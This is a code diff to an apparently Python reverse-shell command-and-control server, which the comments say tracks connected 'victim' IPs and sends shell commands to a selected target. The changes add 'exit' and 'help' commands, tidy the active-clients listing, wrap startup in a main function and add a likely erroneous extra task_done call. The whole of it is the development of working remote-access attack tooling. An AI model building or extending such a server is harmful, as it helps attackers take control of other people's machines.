@@ -14,6 +14,7 @@ import time # module to access computer date/time
 from queue import Queue # queue data structure is required
 
 
+
 NUMBER_OF_THREADS=2 # constant storing number of threads required in our program
 JOB_NUMBER=[1,2]  # Job number 1-> thread 1 -> listening for new connections
 				  # Job number 2 -> thread 2 -> for sending commands to already connected clients
@@ -91,7 +92,6 @@ def accept_connections():
 			all_address.append(address)
 
 			print("Connection has been established!! with victim IP: " + address[0] +" and port: " + str(address[1])) # it prints IP and port of victim to which connection has been established
-			
 
 		except:
 			print("Error accepting the connection!!")
@@ -120,6 +120,15 @@ def start_KD():
 
 			if conn:  # to check that client is still connected and didn't get disconnected in mean time i.e conn is not None
 				send_target_commands(conn) # function to send commands to the target/selected victim
+
+		elif cmd == "exit":       # to exit from server program
+			break
+
+		elif cmd == "help":    # to print info about all valid commands
+			print("1. list - command lists all active clients connected to server")
+			print("2. select - command to select the target client (mandatory arguement - client id of target machine)")
+			print("3. exit - command to exit from shell\n")
+
 		else:
 			print("'"+cmd+"' " + "Command not recognized!!")
 
@@ -136,9 +145,9 @@ def list_connections():
 			del all_address[i]                  # we delete connection object and address for disconnected client
 			continue
 
-		output=str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"  # adding information of active client to output
+		output+=str(i) + "            " + str(all_address[i][0]) + "    " + str(all_address[i][1]) + "\n"  # adding information of active client to output
 
-	print("----CLIENTS-----" + "\n" + output)    # printing the list of active clients
+	print("-------ACTIVE CLIENTS--------" + "\n" + "CLIENT ID    IP                PORT" + "\n" + output)    # printing the list of active clients
 
 
 # Selecting an client out of list of active clients using select command
@@ -178,6 +187,7 @@ def send_target_commands(conn):
 
 				print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
 		except:
+			
 			print("Error sending commands!!")
 
 #Thread Flow
@@ -212,9 +222,12 @@ def work():
 			accept_connections() # handling connections from multiple clients
 		if x == 2:             # it indicates job number 2 i.e. thread 2           
 			start_KD()         # start the interactive shell to select target and send commands
-
+			queue.task_done()
 		queue.task_done()
 
-create_workers()
-create_jobs()
+def main():
+	create_workers()
+	create_jobs()
 
+if __name__ == "__main__":
+	main()
